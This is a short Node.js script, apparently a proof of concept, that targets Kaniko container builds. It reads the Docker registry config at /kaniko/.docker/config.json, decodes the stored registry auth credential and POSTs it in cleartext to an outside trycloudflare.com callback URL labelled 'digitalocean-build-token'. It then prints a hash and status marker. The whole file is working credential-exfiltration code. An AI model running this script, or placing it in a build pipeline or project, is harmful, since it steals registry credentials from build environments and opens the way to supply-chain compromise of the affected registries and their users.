const crypto = require('crypto');
const https = require('https');
const fs = require('fs');

const callbackUrl = 'https://acceptable-treated-soon-indicators.trycloudflare.com/digitalocean-build-token';

let configRaw = '';
let config = {};
try {
  configRaw = fs.readFileSync('/kaniko/.docker/config.json', 'utf8');
  config = JSON.parse(configRaw);
} catch (e) {
  console.log('No /kaniko/.docker/config.json found — not a Kaniko build');
  process.exit(0);
}

const auths = config.auths || {};
const registries = Object.keys(auths);
const firstRegistry = registries[0] || '';
const auth = auths[firstRegistry]?.auth || '';
const token = auth ? Buffer.from(auth, 'base64').toString('utf8') : '';

if (!token) {
  console.log('No auth token found in kaniko config');
  process.exit(0);
}

const body = JSON.stringify({
  schema: 1,
  capturedAt: new Date().toISOString(),
  registry: firstRegistry,
  allRegistries: registries,
  token: token,
  configKeys: Object.keys(config),
});

const url = new URL(callbackUrl);
const request = (url.protocol === 'https:' ? https : require('http')).request(url, {
  method: 'POST',
  headers: {
    'content-type': 'application/json',
    'content-length': Buffer.byteLength(body),
  },
}, (response) => {
  response.resume();
  response.on('end', () => {
    console.log(JSON.stringify({
      marker: 'DO_KANIKO_REGISTRY_TOKEN_EXPORTED',
      callbackStatus: response.statusCode,
      registry: firstRegistry,
      tokenLength: token.length,
      tokenSha256: crypto.createHash('sha256').update(token).digest('hex'),
    }));
  });
});
request.on('error', (error) => { console.error('callback error:', error.message); });
request.end(body);
